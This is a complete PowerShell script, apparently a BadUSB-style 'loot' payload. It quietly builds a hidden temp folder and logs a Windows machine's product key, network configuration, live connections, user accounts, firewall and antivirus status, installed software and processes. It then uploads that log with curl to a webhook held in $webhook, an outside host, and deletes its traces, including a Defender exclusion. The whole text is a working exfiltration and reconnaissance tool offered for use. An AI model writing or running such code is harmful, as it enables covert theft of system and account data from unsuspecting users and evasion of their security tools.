# Check if Admin
$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Check if running as administrator
if ($Admin) {
    Write-Host "Running as Administrator."
} else {
    Write-Host "Not running as Administrator."
}

# Create a temp directory
$dir = "$env:temp\JHknfuiD"
if (!(Test-Path -Path "$dir")) {
New-Item -ItemType Directory -Path "$dir"
}

# Hide the directory
$hide = Get-Item "$dir" -Force
$hide.attributes='Hidden'

Start-Sleep 5

# Set Log variable
$log = "$dir\output.txt"
Out-File -FilePath "$log"

Add-Content "$log" "~Start~"

# Date
$CurrentDate = Get-Date -DisplayHint Date
Add-content "$log" "Date: $($CurrentDate)"

Add-Content "$log" "== ==","", "~Operating System~"

# OS Version
$GetOS = (Get-CimInstance Win32_OperatingSystem).caption
$GetBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
Add-content "$log" "Operating System: $GetOS $GetBuild"

# OS Architecture
$GetBit = (Get-CimInstance Win32_operatingsystem).OSArchitecture
Add-Content "$log" "OS Archit: $GetBit"

# Product Key
$GetOKey = (Get-CimInstance -ClassName SoftwareLicensingService).OA3xOriginalProductKey
if ( $GetOKey -eq "" ) {
  $GetOKey = "No Valid Key Found."
}
Add-Content "$log" "Product Key: $GetOKey"

# OS Install Date
$InstallD = (Get-CimInstance Win32_OperatingSystem).InstallDate
Add-Content "$log" "OS Install: $InstallD"

# OS Language
$GetOL = (Get-UICulture).Name
Add-Content "$log" "Language: $GetOL"

Add-Content "$log" "== ==", "", "~Network Information~"

# Get network adapters
$networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
foreach ($adapter in $networkAdapters) {
    $adapterIndex = $adapter.ifIndex
    $ipAddresses = (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $adapterIndex }).IPAddress
    $macAddress = $adapter.MacAddress
    $gateway = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.InterfaceIndex -eq $adapterIndex }).NextHop
    
    $dnsServerSettings = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.InterfaceIndex -eq $adapterIndex }
    $dnsServers = $dnsServerSettings.DNSServerSearchOrder

    # Output network adapter information
    Add-Content "$log" "Adapter: $($adapter.Name)"
    Add-Content "$log" "IP Addresses: $($ipAddresses -join ', ')"
    Add-Content "$log" "MAC Address: $macAddress"
    Add-Content "$log" "Default Gateway: $gateway"
    Add-Content "$log" "DNS Servers: $($dnsServers -join ', ')"
}

Add-Content "$log" "== ==", "", "~Active Network Connections~"

# Get active network connections
$activeConnections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
Add-Content "$log" "Active Network Connections:"

$activeConnections | ForEach-Object {
    $localAddress = $_.LocalAddress
    $localPort = $_.LocalPort
    $remoteAddress = $_.RemoteAddress
    $remotePort = $_.RemotePort
    $processId = $_.OwningProcess
    $processName = (Get-Process -Id $processId).Name
    
    $connectionInfo = "- Local: " + $localAddress + ":" + $localPort + ", Remote: " + $remoteAddress + ":" + $remotePort + ", Process: " + $processName + " (PID: " + $processId + ")"
    Add-Content "$log" $connectionInfo
    }

Add-Content "$log" "== ==", "", "~Network Speed~"

# Test network speed
$targetAddress = "www.speedtest.net"
$pingResults = Test-Connection -ComputerName $targetAddress -Count 1 -ErrorAction SilentlyContinue

if ($pingResults) {
    $averagePingTime = ($pingResults | Measure-Object ResponseTime -Average).Average
    $networkSpeed = [math]::Round((8 * 1000) / $averagePingTime, 2)  # Convert to bits and round to 2 decimal places
    Add-Content "$log" "Average Ping Time: $averagePingTime ms"
    Add-Content "$log" "Network Speed: $networkSpeed Mbps"
} else {
    Add-Content "$log" "Network speed measurement failed."
}

Add-Content "$log" "== ==", "", "~RAM~"

# RAM Space
$TotalRAM = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
Add-content "$log" "RAM: $($TotalRAM)GB"

# RAM Load
$CompObject =  Get-WmiObject -Class WIN32_OperatingSystem
$LoadRAM = [Math]::Round((($CompObject.TotalVisibleMemorySize - $CompObject.FreePhysicalMemory)*100)/ $CompObject.TotalVisibleMemorySize)
Add-Content "$log" "RAM usage: $LoadRAM%"

Add-Content "$log" "== ==", "", "~CPU~"

# CPU Name
$GetCPU = Get-WmiObject Win32_processor | select -Expand Name -Unique
Add-content "$log" "CPU: $GetCPU"

# CPU Speed
$SpeedCPU = (Get-CimInstance Win32_Processor).CurrentClockSpeed
Add-content "$log" "CPU speed: $SpeedCPU"


# CPU  Load
$LoadCPU = (Get-CimInstance Win32_Processor).LoadPercentage
Add-Content "$log" "CPU Usage: $LoadCPU%"

Add-Content "$log" "== ==", "", "~GPU~"

# GPU Name
$GetGPU = Get-CimInstance win32_VideoController | select -Expand Name -Unique
Add-content "$log" "GPU: $GetGPU"

# Monitor
$lines = Get-WmiObject -Namespace 'root/wmi' -Class WmiMonitorID | Out-String -Stream | Select-String -Pattern "Active"
$trimlines = ($lines) -notmatch '^\s*$'
$num_monitors = $trimlines.Length
Add-Content "$log" "Connected Monitors: $num_monitors"

Add-Content "$log" "== ==", "","~Monitor Resolution~"

# Resolution 
Add-Type -AssemblyName System.Windows.Forms
$counter = 1
$screens = [System.Windows.Forms.Screen]::AllScreens
$screenResolutions = $screens.Bounds | ForEach-Object {
    [PSCustomObject]@{
        Width = $_.Width
        Height = $_.Height
    }
}

$screenResolutions | ForEach-Object {
    $line = "$counter : $($_.Width) x $($_.Height)"
    $counter++
    Out-File -FilePath $log -Append -InputObject $line
}

Add-Content "$log" "== ==", "", "~System Info~"

# Last Restart
$UptDays = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).Days
$UptHours = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).Hours
$UptMinutes = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).Minutes
Add-Content "$log" "Last Restart: $($UptDays) days, $($UptHours) hours and $($UptMinutes) minutes"

# Get number of users 
$GetNU = (Get-CimInstance Win32_operatingsystem).NumberOfUsers
Add-Content "$log" "Active Users: $GetNU"

# Current user
$CurUser = (Get-CimInstance -ClassName Win32_ComputerSystem).Username
Add-Content "$log" "Current User: $CurUser"

# All Active Users
$AllUsers = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True and NOT Disabled=True" | Select-Object Name | ForEach-Object {$_.Name} 
"", "Accounts", "--------", $AllUsers | Out-File -FilePath "$log" -Append

# Guest Account Active
$GuestA = Get-LocalUser -Name "Guest" | Select Name, Enabled | ForEach-Object {$_.Enabled}
"Guest Account: $GuestA" | Out-File -FilePath "$log" -Append

Add-Content "$log" "== ==", "", "~Security Information~"

# Windows Firewall Status
$firewallStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled).Enabled
$firewallStatusStr = if ($firewallStatus -eq 'True') { 'Enabled' } else { 'Disabled' }
Add-Content "$log" "Windows Firewall: $firewallStatusStr"

# Antivirus Software Status (Windows Security Center)
$antivirusStatus = Get-CimInstance -Namespace "Root/SecurityCenter2" -ClassName "AntivirusProduct" |
                   Select-Object DisplayName, ProductState
$antivirusEnabled = $antivirusStatus | Where-Object { $_.ProductState -eq 397568 }
if ($antivirusEnabled) {
    Add-Content "$log" "Antivirus Software: $($antivirusEnabled.DisplayName) (Enabled)"
} else {
    Add-Content "$log" "Antivirus Software: Not detected or Disabled"
}

# Security-related settings (e.g., Windows Defender)
$defenderStatus = Get-MpPreference | Select-Object RealTimeProtectionEnabled
$defenderStatusStr = if ($defenderStatus.RealTimeProtectionEnabled -eq 'True') { 'Enabled' } else { 'Disabled' }
Add-Content "$log" "Windows Defender Real-Time Protection: $defenderStatusStr"

Add-Content "$log" "== ==", "", "~Drives~"

# Dirves
$GetDrive = gdr -PSProvider 'FileSystem' | Format-Table Root, @{n="Free";e={[math]::Round($_.Free/1GB,2)}},@{n="Used";e={[math]::Round($_.Used/1GB,2)}}
$GetDrive | Out-File -FilePath "$log" -Append

Add-Content "$log" "== ==", "", "~Installed Apps~"

# Get a list of all installed apps
$apps = Get-WmiObject -Class Win32_Product | Select-Object -Property Name

# Sort the apps alphabetically
$sortedApps = $apps | Sort-Object -Property Name

# Write the sorted apps to the log file
$sortedApps | ForEach-Object {
    $_.Name | Out-File -FilePath $log -Append
}

Add-Content "$log" "== ==", "", "~Connected USB~"

# Get a list of USB devices
$usbDevices = Get-WmiObject -Class Win32_USBControllerDevice |
              ForEach-Object { [wmi]($_.Dependent) } |
              Select-Object Manufacturer, Description

# Write USB devices to the log file
$usbDevices | Select-Object Manufacturer, Description |
    Out-File -FilePath $log -Append

Add-Content "$log" "== ==", "~Active Processes~"

# Processes
$processMemoryUsage = Get-WmiObject WIN32_PROCESS | Sort-Object -Property ws -Descending | Select-Object processname, @{Name="Mem Usage(MB)";Expression={[math]::round($_.ws / 1mb)}}
$processMemoryUsage | Out-File -FilePath "$log" -Append

$filePath = $log

if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

if (-not (Test-Path $filePath)) {
    New-Item -Path $filePath -ItemType File
}

$hexColor = "552583"
$colorInt = [convert]::ToInt32($hexColor, 16)

# Read the content from a text file and split it based on '== ==' delimiter
$fileContentArray = (Get-Content $filePath -Raw) -split '== =='

foreach ($contentPart in $fileContentArray) {
    # Truncate content to 2000 characters if needed
    if ($contentPart.Length -gt 2000) {
        $contentPart = $contentPart.Substring(0, 2000) + "..."
    }

    # Extract the image URL from the content part, assuming it's a URL format.
    $imageUrl = if ($contentPart -match '(https?://[^\s]+)') { $matches[1] } else { '' }
    $title = if ($contentPart -match '~(.+?)~') { $matches[1] } else { '' }

    # Create the payload as a PowerShell object
    $payloadObject = @{
        username = $env:ComputerName
        embeds = @(
            @{
                title       = $title
                description = $contentPart -replace '(https?://[^\s]+)', '' -replace '~(.+?)~', '' # Remove image URL and title
                color       = $colorInt
                image       = @{ url = $imageUrl }
            }
        )
    }

    # Convert the payload object to a JSON string
    $payloadJson = $payloadObject | ConvertTo-Json -Depth 4

# Save the JSON payload to a temporary file
$tempFile = [System.IO.Path]::GetTempFileName()
Set-Content -Path $tempFile -Value $payloadJson

# Prepare and run the curl command
$curlCommand = @(
    'curl.exe',
    '-H', 'Content-Type: application/json',
    '--data-binary', "@$tempFile",  # Note the '@' symbol, which means to load data from a file
    '-v',  # for verbose output
    $webhook
)

# Print the curl command to the console for debugging
Write-Host "Executing: $($curlCommand -join ' ')"

# Run the curl command
& $curlCommand[0] $curlCommand[1..($curlCommand.Length - 1)]

# Check for curl exit code
if ($LASTEXITCODE -ne 0) {
    Write-Host "Curl exited with code $LASTEXITCODE"
}

# Delete the temporary file
Remove-Item -Path $tempFile

Start-Sleep -Seconds 1

}

# Send loot to Webhook
curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1

Start-Sleep -Seconds 5

# Clean up time
if ($Admin -eq 'True'){
  Set-MpPreference -DisableRealtimeMonitoring $false

  Remove-MpPreference -ExclusionPath "$dir"
}
$unhide = Get-Item "$dir" -Force
$unhide.attributes='Normal'
Remove-Item -Path "$dir" -Recurse -Force
Exit